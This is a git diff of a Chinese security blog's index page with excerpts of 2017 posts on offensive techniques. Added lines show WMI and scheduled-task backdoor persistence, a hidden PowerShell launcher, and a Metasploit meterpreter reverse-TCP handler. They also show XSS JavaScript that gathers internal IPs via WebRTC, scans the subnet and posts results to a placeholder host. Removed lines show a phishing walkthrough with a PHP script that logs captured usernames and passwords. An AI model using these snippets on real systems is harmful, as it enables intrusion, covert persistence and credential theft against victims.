@@ -117,6 +117,384 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2017/07/12/wmi.html" >WMI学习笔记</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-07-12  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="windows下的定时任务"><a href="#windows下的定时任务" class="headerlink" title="windows下的定时任务"></a>windows下的定时任务</h3><blockquote>
+<p>维持权限的话还是考虑WMI事件或者在服务上下手.  如劫持相关服务指向的程序，未被双引号保护的路径等，添加计划任务一旦被报警.就是整个团队的灾难</p>
+</blockquote>
+<h2 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h2><p>wmi的逻辑结构是这样的：<br>首先是wmi使用者，比如脚本或者其他用到wmi接口的应用程序。由wmi使用者访问CIM对象管理器WinMgmt（即WMI服务），后者再访问CIM（公共信息模型Common Information Model）存储库。</p>
+<p>静态或动态的信息（对象的属性）就保存在CIM库中，同时保存对象的方法。比如启动一个服务，通过执行对象的方法实现，实际上是通过COM技术调用各种dll，最后由dll中封装的API完成请求。WMI是事件驱动的，操作系统、服务、应用程序、设备驱动程序等都可以作为事件源，通过COM接口生成事件通知，WinMgmt捕捉到事件，然后刷新CIM库中的动态信息。这也是为什么WMI服务依赖于EventLog的原因。就像注册表有根键一样，CIM库也有分类，用面向对象的术语描述来来说，叫做命名空间(Name Space）</p>
+<p><a target="_blank" rel="noopener" href="http://huaidan.org/archives/1087.html">http://huaidan.org/archives/1087.html</a></p>
+<p>可以调用wmi的方式或者语言:</p>
+<pre class="line-numbers language-none"><code class="language-none">* wmic.exe
+* winrm.exe
+* winrs.exe
+* powershell
+* windows scripting host(WSH)
+   * VBScript
+   * JScript
+* mof
+* C&#x2F;C++ via IWbem* COM API
+* .NET System.Management classes
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>单一点：<br>一个定时功能后门的wmi，其中的事件过滤是用WQL查询来触发，wooyun上面油三种触发方式:</p>
+<h3 id="WSH"><a href="#WSH" class="headerlink" title="WSH"></a>WSH</h3>
+	
+
+	</div>
+  <a type="button" href="/2017/07/12/wmi.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="windows下的定时任务"><a href="#windows下的定时任务" class="headerlink" title="windows下的定时任务"></a>windows下的定时任务</h3><blockquote>
+<p>维持权限的话还是考虑WMI事件或者在服务上下手.  如劫持相关服务指向的程序，未被双引号保护的路径等，添加计划任务一旦被报警.就是整个团队的灾难</p>
+</blockquote>
+<h2 id="WMI后门"><a href="#WMI后门" class="headerlink" title="WMI后门"></a>WMI后门</h2><p>wmi的逻辑结构是这样的：<br>首先是wmi使用者，比如脚本或者其他用到wmi接口的应用程序。由wmi使用者访问CIM对象管理器WinMgmt（即WMI服务），后者再访问CIM（公共信息模型Common Information Model）存储库。</p>
+<p>静态或动态的信息（对象的属性）就保存在CIM库中，同时保存对象的方法。比如启动一个服务，通过执行对象的方法实现，实际上是通过COM技术调用各种dll，最后由dll中封装的API完成请求。WMI是事件驱动的，操作系统、服务、应用程序、设备驱动程序等都可以作为事件源，通过COM接口生成事件通知，WinMgmt捕捉到事件，然后刷新CIM库中的动态信息。这也是为什么WMI服务依赖于EventLog的原因。就像注册表有根键一样，CIM库也有分类，用面向对象的术语描述来来说，叫做命名空间(Name Space）</p>
+<p><a target="_blank" rel="noopener" href="http://huaidan.org/archives/1087.html">http://huaidan.org/archives/1087.html</a></p>
+<p>可以调用wmi的方式或者语言:</p>
+<pre class="line-numbers language-none"><code class="language-none">* wmic.exe
+* winrm.exe
+* winrs.exe
+* powershell
+* windows scripting host(WSH)
+   * VBScript
+   * JScript
+* mof
+* C&#x2F;C++ via IWbem* COM API
+* .NET System.Management classes
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>单一点：<br>一个定时功能后门的wmi，其中的事件过滤是用WQL查询来触发，wooyun上面油三种触发方式:</p>
+<h3 id="WSH"><a href="#WSH" class="headerlink" title="WSH"></a>WSH</h3>
+	
+	</div>
+  <a type="button" href="/2017/07/12/wmi.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/05/24/schtasks定时后门.html" >powershell定时任务后门</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-05-24  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>windows下查询定时任务，会出现无法加载列资源的情况：</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
+<pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmd执行之后，切换到英文的cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;列出所有task
+schtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;列出所有xml文件格式的定时任务
+schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;列出某个任务的详细信息（TN: TaskName)
+schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;删除某个定时任务，这个名字可以再query的时候找到, &#x2F;f 强制删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>一种是定时任务，但是执行powershell的时候会弹窗<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>设置userid   <userid>NT AUTHORITY\SYSTEM</userid> 即可</p>
+<pre class="line-numbers language-none"><code class="language-none">Dim shell,command
+command &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;
+set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)
+shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>msf接收多个shell可以如下这样做：</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
+set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp
+set LHOST 192.168.1.117
+set LPORT 31337
+set ExitOnSession false
+exploit -j -z
+
+或者上面的保存为listener.rc，然后msfconsole启动
+msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>XML文件如下:</p>
+	
+
+	</div>
+  <a type="button" href="/2017/05/24/schtasks定时后门.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>windows下查询定时任务，会出现无法加载列资源的情况：</p>
+<p><a target="_blank" rel="noopener" href="https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1">https://raw.githubusercontent.com/Ridter/Pentest/master/backdoor/Persistent/Schtasks-Backdoor.ps1</a></p>
+<pre class="line-numbers language-none"><code class="language-none">chcp 437  &#x2F;&#x2F;cmd执行之后，切换到英文的cmd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">schtasks &#x2F;query  &#x2F;&#x2F;列出所有task
+schtasks &#x2F;query &#x2F;xml  &#x2F;&#x2F;列出所有xml文件格式的定时任务
+schtasks &#x2F;query &#x2F;xml &#x2F;TN &#39;name&#39; &#x2F;&#x2F;列出某个任务的详细信息（TN: TaskName)
+schtasks &#x2F;delete &#x2F;TN  &quot;name&quot; &#x2F;&#x2F;删除某个定时任务，这个名字可以再query的时候找到, &#x2F;f 强制删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+<p>一种是定时任务，但是执行powershell的时候会弹窗<br><a target="_blank" rel="noopener" href="https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work">https://superuser.com/questions/478052/windows-7-task-scheduler-hidden-setting-doesnt-work</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/">https://www.scriptjunkie.us/2013/01/running-code-from-a-non-elevated-account-at-any-time/</a><br>设置userid   <userid>NT AUTHORITY\SYSTEM</userid> 即可</p>
+<pre class="line-numbers language-none"><code class="language-none">Dim shell,command
+command &#x3D; &quot;powershell.exe -nologo -command \\PrintServer\PrintRelease.ps1&quot;
+set shell &#x3D; CreateObject(&quot;WScript.Shell&quot;)
+shell.Run command,0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>msf接收多个shell可以如下这样做：</p>
+<pre class="line-numbers language-none"><code class="language-none">use exploit&#x2F;multi&#x2F;handler
+set PAYLOAD windows&#x2F;meterpreter&#x2F;reverse_tcp
+set LHOST 192.168.1.117
+set LPORT 31337
+set ExitOnSession false
+exploit -j -z
+
+或者上面的保存为listener.rc，然后msfconsole启动
+msfconsole -r .&#x2F;listener.rc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>XML文件如下:</p>
+	
+	</div>
+  <a type="button" href="/2017/05/24/schtasks定时后门.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2017/05/23/xss-get-ip.html" >XSS获取内网地址</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2017-05-23  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p>
+<p>代码未测试</p>
+<pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+if (RTCPeerConnection) (function()&#123;
+	var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);
+	if (window.mozRTCPeerConnection)&#123;
+		rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);
+	&#125;;
+	rtc.onicecandidate &#x3D; function(evt)&#123;
+		if (evt.candidate) grepSDP(evt.candidate.candidate);
+	&#125;;
+	rtc.createOffer(function(offerDesc)&#123;
+		grepSDP(offerDesc.sdp);
+		rtc.setLocalDescription(offerDesc);
+	&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);
+	var addrs &#x3D; Object.create(null);
+	addrs[&quot;0.0.0.0&quot;] &#x3D; false;
+	function updateDisplay(newAddr)&#123;
+		if(newAddr in addrs) return;
+		else addrs[newAddr] &#x3D; true;
+		var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);
+		var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;
+		sendip(address);
+	&#125;
+	function grepSDP(sdp)&#123;
+		var hosts &#x3D; [];
+		sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;
+			if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;
+				var parts &#x3D; line.split(&#39; &#39;),
+				addr &#x3D; parts[4],
+				type &#x3D; parts[7];
+				if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);
+			&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;
+				var parts &#x3D; line.split(&#39; &#39;),
+				addr &#x3D; parts[2];
+				updateDisplay(addr);
+			&#125;
+		&#125;);
+	&#125;
+&#125;)();
+function sendip(ipaddress)&#123;
+	var url &#x3D; &quot;xxxxx&quot;;
+&#125;
+
+＝＝＝＝代码貌似不全＝＝＝＝
+
+function ipsend(ip, netport)&#123;
+	var ipdata &#x3D; ip+&quot;:&quot;+netport;
+	var url &#x3D; &quot;x.x.x.x&quot;;
+	var xmlhttp1 &#x3D; new XMLHttpRequest();
+	xmlhttp1.open(&quot;POST&quot;,url,true);
+	xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);
+	xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);
+
+function ipCreate(ip)&#123;
+	var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);
+	for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;
+		ElementCreate(ips+i,&quot;80&quot;,i);
+		ElementCreate(ips+i,&quot;8087&quot;,i);
+		ElementCreate(ips+i,&quot;8080&quot;,i);
+	&#125;
+&#125;
+function ElementCreate(ip,xport,i)&#123;
+	var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;
+	var scriptElement &#x3D; document.createElement(&quot;script&quot;);
+	scriptElement.src &#x3D; url;
+	scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);
+	document.body.appendChild(scriptElement);
+&#125;
+ipcreate(&quot;10.10.125.195&quot;);
+&#125;
+
+&#x3D;＝＝＝＝代码貌似不全＝＝＝＝
+
+
+
+
+
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2017/05/23/xss-get-ip.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p><a target="_blank" rel="noopener" href="http://cb.drops.wiki/bugs/wooyun-2014-076685.html">http://cb.drops.wiki/bugs/wooyun-2014-076685.html</a> </p>
+<p>代码未测试</p>
+<pre class="line-numbers language-none"><code class="language-none">var RTCPeerConnection &#x3D; window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
+if (RTCPeerConnection) (function()&#123;
+	var rtc &#x3D; new RTCPeerConnection(&#123;iceServers:[]&#125;);
+	if (window.mozRTCPeerConnection)&#123;
+		rtc.createDataChannel(&#39;&#39;,&#123;reliable:false&#125;);
+	&#125;;
+	rtc.onicecandidate &#x3D; function(evt)&#123;
+		if (evt.candidate) grepSDP(evt.candidate.candidate);
+	&#125;;
+	rtc.createOffer(function(offerDesc)&#123;
+		grepSDP(offerDesc.sdp);
+		rtc.setLocalDescription(offerDesc);
+	&#125;,function(e)&#123;console.warn(&quot;offer failed&quot;, e);&#125;);
+	var addrs &#x3D; Object.create(null);
+	addrs[&quot;0.0.0.0&quot;] &#x3D; false;
+	function updateDisplay(newAddr)&#123;
+		if(newAddr in addrs) return;
+		else addrs[newAddr] &#x3D; true;
+		var displayAddrs &#x3D; Object.keys(addrs).filter(function(k)&#123;return addrs[k];&#125;);
+		var address &#x3D; displayAddrs.join(&quot;or perhaps&quot;) || &quot;n&#x2F;a&quot;;
+		sendip(address);
+	&#125;
+	function grepSDP(sdp)&#123;
+		var hosts &#x3D; [];
+		sdp.split(&#39;\r\n&#39;).forEach(function(line)&#123;
+			if(~line.indexOf(&quot;a&#x3D;candidate&quot;))&#123;
+				var parts &#x3D; line.split(&#39; &#39;),
+				addr &#x3D; parts[4],
+				type &#x3D; parts[7];
+				if(type &#x3D;&#x3D;&#x3D; &#39;host&#39;) updateDisplay(addr);
+			&#125;else if(~line.indexOf(&quot;c&#x3D;&quot;))&#123;
+				var parts &#x3D; line.split(&#39; &#39;),
+				addr &#x3D; parts[2];
+				updateDisplay(addr);
+			&#125;
+		&#125;);
+	&#125;
+&#125;)();
+function sendip(ipaddress)&#123;
+	var url &#x3D; &quot;xxxxx&quot;;
+&#125;
+
+＝＝＝＝代码貌似不全＝＝＝＝
+
+function ipsend(ip, netport)&#123;
+	var ipdata &#x3D; ip+&quot;:&quot;+netport;
+	var url &#x3D; &quot;x.x.x.x&quot;;
+	var xmlhttp1 &#x3D; new XMLHttpRequest();
+	xmlhttp1.open(&quot;POST&quot;,url,true);
+	xmlhttp1.setRequestHeader(&quot;Content-Type&quot;,&quot;application&#x2F;x-www-form-urlencoded&quot;);
+	xmlhttp1.send(&quot;ip&#x3D;&#x3D;&lt;!--start--&gt;&quot; + ipdata);
+
+function ipCreate(ip)&#123;
+	var ips &#x3D; ip.replace(&#x2F;(\d+\.\d+\.\d+)\.\d+&#x2F;,&#39;$1.&#39;);
+	for(var i&#x3D;1;i&lt;&#x3D;255;i++)&#123;
+		ElementCreate(ips+i,&quot;80&quot;,i);
+		ElementCreate(ips+i,&quot;8087&quot;,i);
+		ElementCreate(ips+i,&quot;8080&quot;,i);
+	&#125;
+&#125;
+function ElementCreate(ip,xport,i)&#123;
+	var url &#x3D; &quot;http:&#x2F;&#x2F;&quot;+ip+&quot;:&quot;+xport;
+	var scriptElement &#x3D; document.createElement(&quot;script&quot;);
+	scriptElement.src &#x3D; url;
+	scriptElement.setAttribute(&quot;onload&quot;,&quot;ipsend(\&#39;&quot;+ip+&quot;\&#39;,\&#39;&quot;+xport+&quot;\&#39;)&quot;);
+	document.body.appendChild(scriptElement);
+&#125;
+ipcreate(&quot;10.10.125.195&quot;);
+&#125;
+
+&#x3D;＝＝＝＝代码貌似不全＝＝＝＝
+
+
+
+
+
+
+
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2017/05/23/xss-get-ip.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2017/05/19/baopo-Q.html" >某企业邮箱爆破</a>
 		</h3>
 		</div>
@@ -333,320 +711,6 @@ http:&#x2F;&#x2F;slides.com&#x2F;mscasharjaved&#x2F;deck-13#&#x2F;169
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/04/01/how-to-fish.html" >How To Fishing</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-04-01  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>[XSS钓鱼模拟实战]<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
-</blockquote>
-<h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><pre class="line-numbers language-none"><code class="language-none">目标登录页面: login.html
-假的登录页面: fake.html
-世界上最好的语言: deal.php
-fish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<h3 id="钓鱼步骤"><a href="#钓鱼步骤" class="headerlink" title="钓鱼步骤"></a>钓鱼步骤</h3><ul>
-<li>先下载目标login.html，保存为fake.html: <code>wget -r -p -np -k 网站地址</code></li>
-</ul>
-<p>然后替换掉登录时候的POST目标地址，比如<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>，替换掉自己的deal.php页面。</p>
-<p>注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html</p>
-<ul>
-<li>然后再服务器上构造一个deal.php</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-$user &#x3D; $_POST[&#39;username&#39;];
-$pass &#x3D; $_POST[&#39;password&#39;];
-$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);
-fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);
-fclose($f);
-header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;跳转到正常的后台
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<ul>
-<li>还差一个js</li>
-</ul>
-	
-
-	</div>
-  <a type="button" href="/2017/04/01/how-to-fish.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<blockquote>
-<p>[XSS钓鱼模拟实战]<a target="_blank" rel="noopener" href="https://bbs.ichunqiu.com/thread-17965-1-1.html">https://bbs.ichunqiu.com/thread-17965-1-1.html</a></p>
-</blockquote>
-<h3 id="前置准备"><a href="#前置准备" class="headerlink" title="前置准备"></a>前置准备</h3><pre class="line-numbers language-none"><code class="language-none">目标登录页面: login.html
-假的登录页面: fake.html
-世界上最好的语言: deal.php
-fish.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<h3 id="钓鱼步骤"><a href="#钓鱼步骤" class="headerlink" title="钓鱼步骤"></a>钓鱼步骤</h3><ul>
-<li>先下载目标login.html，保存为fake.html: <code>wget -r -p -np -k 网站地址</code></li>
-</ul>
-<p>然后替换掉登录时候的POST目标地址，比如<code>&lt;form action=&quot;http://normal.com/login.php&quot; method=&quot;post&quot;&gt;</code>，替换掉自己的deal.php页面。</p>
-<p>注意事项: 页面中有部分js或者css不是绝对路径，要替换为绝对路径，最好直接使用wget下载login.html</p>
-<ul>
-<li>然后再服务器上构造一个deal.php</li>
-</ul>
-<pre class="line-numbers language-none"><code class="language-none">&lt;?php
-$user &#x3D; $_POST[&#39;username&#39;];
-$pass &#x3D; $_POST[&#39;password&#39;];
-$f &#x3D; fopen(&#39;pass.txt&#39;,&#39;a&#39;);
-fwrite($f, &quot;User:&quot;.$user.&quot;Pass:&quot;.$pass.&quot;\n&quot;);
-fclose($f);
-header(&quot;Location: http:&#x2F;&#x2F;normal.com&#x2F;manage&quot;); &#x2F;&#x2F;跳转到正常的后台
-?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<ul>
-<li>还差一个js</li>
-</ul>
-	
-	</div>
-  <a type="button" href="/2017/04/01/how-to-fish.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2017/03/09/copy-shared-lib.html" >Linux复制带动态库的命令</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2017-03-09  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>需求： 从一台Linux复制命令到另外一台上面，由于命令依赖动态库，比如gcc:</p>
-<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
-	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
-	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
-	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这种情况下单单复制gcc没卵用，google了下找到某个bash脚本:</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
-
-if [ $# !&#x3D; 2 ] ; then
-    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
-    exit 1
-fi
-
-PATH_TO_BINARY&#x3D;&quot;$1&quot;
-TARGET_FOLDER&#x3D;&quot;$2&quot;
-
-# if we cannot find the the binary we have to abort
-if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
-    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
-    exit 1
-fi
-
-# copy the binary to the target folder
-# create directories if required
-echo &quot;---&gt; copy binary itself&quot;
-cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;
-
-# copy the required shared libs to the target folder
-# create directories if required
-echo &quot;---&gt; copy libraries&quot;
-for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
-   if [ -f &quot;$lib&quot; ] ; then
-        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
-   fi  
-done
-
-# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
-# however, I&#39;ve not tested that yet
-# create lib64 - if required and link the content from lib to it
-if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
-    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
-fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>用法: <code>exportbin.sh &lt;path to the binary&gt;  &lt;target floder&gt;</code></p>
-<ul>
-<li><a target="_blank" rel="noopener" href="http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/">http://www.metashock.de/2012/11/export-binary-with-lib-dependencies/</a></li>
-</ul>
-
-	
-
-	</div>
-  <a type="button" href="/2017/03/09/copy-shared-lib.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<p>需求： 从一台Linux复制命令到另外一台上面，由于命令依赖动态库，比如gcc:</p>
-<pre class="line-numbers language-none"><code class="language-none">ldd &#96;which gcc&#96;
-	linux-vdso.so.1 &#x3D;&gt;  (0x00007fffdb7eb000)
-	libc.so.6 &#x3D;&gt; &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 (0x00007fcf12441000)
-	&#x2F;lib64&#x2F;ld-linux-x86-64.so.2 (0x000055a28350c000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>这种情况下单单复制gcc没卵用，google了下找到某个bash脚本:</p>
-<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;bin&#x2F;bash
-
-if [ $# !&#x3D; 2 ] ; then
-    echo &quot;usage $0 PATH_TO_BINARY TARGET_FOLDER&quot;
-    exit 1
-fi
-
-PATH_TO_BINARY&#x3D;&quot;$1&quot;
-TARGET_FOLDER&#x3D;&quot;$2&quot;
-
-# if we cannot find the the binary we have to abort
-if [ ! -f &quot;$PATH_TO_BINARY&quot; ] ; then
-    echo &quot;The file &#39;$PATH_TO_BINARY&#39; was not found. Aborting!&quot;
-    exit 1
-fi
-
-# copy the binary to the target folder
-# create directories if required
-echo &quot;---&gt; copy binary itself&quot;
-cp --parents -v &quot;$PATH_TO_BINARY&quot; &quot;$TARGET_FOLDER&quot;
-
-# copy the required shared libs to the target folder
-# create directories if required
-echo &quot;---&gt; copy libraries&quot;
-for lib in &#96;ldd &quot;$PATH_TO_BINARY&quot; | cut -d&#39;&gt;&#39; -f2 | awk &#39;&#123;print $1&#125;&#39;&#96; ; do
-   if [ -f &quot;$lib&quot; ] ; then
-        cp -v --parents &quot;$lib&quot; &quot;$TARGET_FOLDER&quot;
-   fi  
-done
-
-# I&#39;m on a 64bit system at home. the following code will be not required on a 32bit system.
-# however, I&#39;ve not tested that yet
-# create lib64 - if required and link the content from lib to it
-if [ ! -d &quot;$TARGET_FOLDER&#x2F;lib64&quot; ] ; then
-    mkdir -v &quot;$TARGET_FOLDER&#x2F;lib64&quot;
